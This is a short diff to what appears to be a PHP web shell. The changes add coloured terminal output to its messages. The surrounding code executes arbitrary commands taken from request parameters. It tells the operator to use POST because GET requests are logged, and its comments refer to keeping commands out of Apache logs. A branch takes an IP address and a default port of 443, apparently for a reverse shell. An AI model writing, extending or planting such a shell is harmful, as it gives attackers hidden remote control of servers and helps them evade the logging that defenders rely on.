@@ -35,7 +35,8 @@ $port = 'port';
 
 // warn about noisy get requests
 if ($_SERVER['REQUEST_METHOD'] == 'GET') {
-   echo 'GET requests are most likely logged, better use POST instead';
+   echo "\e[0;33mWarning\e[0m: \e[0;31mGET\e[0m requests are most likely logged,";
+   echo " better use \e[0;32mPOST\e[0m instead\n\n";
 }
 
 if (isset($_REQUEST[$cmd])) {
@@ -44,7 +45,7 @@ if (isset($_REQUEST[$cmd])) {
    // command on  apache logs) and notify  on execution
    // failure
    if (!executeCommand($_REQUEST[$cmd])) {
-      echo 'The command failed to run';
+      echo "\e[0;31mError\e[0m: The command failed to run\n";
    }
 } elseif (isset($_REQUEST[$ip])) {
    // default port 443
